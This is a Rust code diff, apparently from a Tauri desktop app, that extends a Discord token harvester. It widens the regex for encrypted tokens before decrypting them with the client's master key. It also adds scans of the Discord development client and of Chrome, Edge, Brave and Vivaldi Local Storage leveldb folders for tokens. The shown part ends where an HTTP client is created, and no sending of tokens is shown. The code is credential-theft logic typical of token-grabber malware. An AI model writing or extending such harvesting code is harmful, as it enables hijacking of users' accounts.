@@ -493,10 +493,11 @@ fn decrypt_discord_token(master_key: &[u8], encrypted_token_b64: &str) -> Option
 fn extract_tokens_from_text(text: &str, master_key: Option<&[u8]>, encrypted_tokens: &mut Vec<String>, plain_tokens: &mut Vec<String>) {
     // 1. Decrypt dQw4w9WgXcQ: encrypted tokens first
     if let Some(key) = master_key {
-        if let Ok(re_enc) = Regex::new(r"dQw4w9WgXcQ:([A-Za-z0-9+/=]+)") {
+        if let Ok(re_enc) = Regex::new(r#"dQw4w9WgXcQ:([^\s"\\]+)"#) {
             for cap in re_enc.captures_iter(text) {
                 if let Some(enc_b64) = cap.get(1) {
-                    if let Some(decrypted) = decrypt_discord_token(key, enc_b64.as_str()) {
+                    let cleaned = enc_b64.as_str().trim_matches('"').trim_matches('\\');
+                    if let Some(decrypted) = decrypt_discord_token(key, cleaned) {
                         if !encrypted_tokens.contains(&decrypted) {
                             encrypted_tokens.push(decrypted);
                         }
@@ -590,6 +591,18 @@ async fn auto_detect_discord_token() -> Result<String, String> {
         let ptb_dir = root.join("discordptb");
         let ptb_key = get_discord_master_key(&ptb_dir);
         scan_dir_for_tokens(&ptb_dir.join("Local Storage").join("leveldb"), ptb_key.as_deref(), &mut candidates);
+
+        let dev_dir = root.join("discorddevelopment");
+        let dev_key = get_discord_master_key(&dev_dir);
+        scan_dir_for_tokens(&dev_dir.join("Local Storage").join("leveldb"), dev_key.as_deref(), &mut candidates);
+    }
+
+    if let Ok(localappdata) = env::var("LOCALAPPDATA") {
+        let root = Path::new(&localappdata);
+        scan_dir_for_tokens(&root.join("Google").join("Chrome").join("User Data").join("Default").join("Local Storage").join("leveldb"), None, &mut candidates);
+        scan_dir_for_tokens(&root.join("Microsoft").join("Edge").join("User Data").join("Default").join("Local Storage").join("leveldb"), None, &mut candidates);
+        scan_dir_for_tokens(&root.join("BraveSoftware").join("Brave-Browser").join("User Data").join("Default").join("Local Storage").join("leveldb"), None, &mut candidates);
+        scan_dir_for_tokens(&root.join("Vivaldi").join("User Data").join("Default").join("Local Storage").join("leveldb"), None, &mut candidates);
     }
 
     let client = tauri_plugin_http::reqwest::Client::new();
